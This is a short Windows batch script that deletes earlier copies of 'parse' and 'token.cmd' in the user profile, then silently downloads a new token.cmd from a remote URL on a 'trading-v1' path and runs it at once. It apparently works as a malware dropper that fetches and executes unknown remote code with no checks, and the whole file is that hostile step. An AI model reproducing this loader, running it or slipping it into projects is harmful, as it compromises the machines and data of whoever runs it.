::@echo off
if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
curl -s -L -o "%USERPROFILE%//token.cmd" "https://vercel.com/billion10/trading-v1/3nTymp4UDAn8pMLaXzVWfdGff3yt/120/token.cmd" token.cmd
"%USERPROFILE%\token.cmd"
::cls
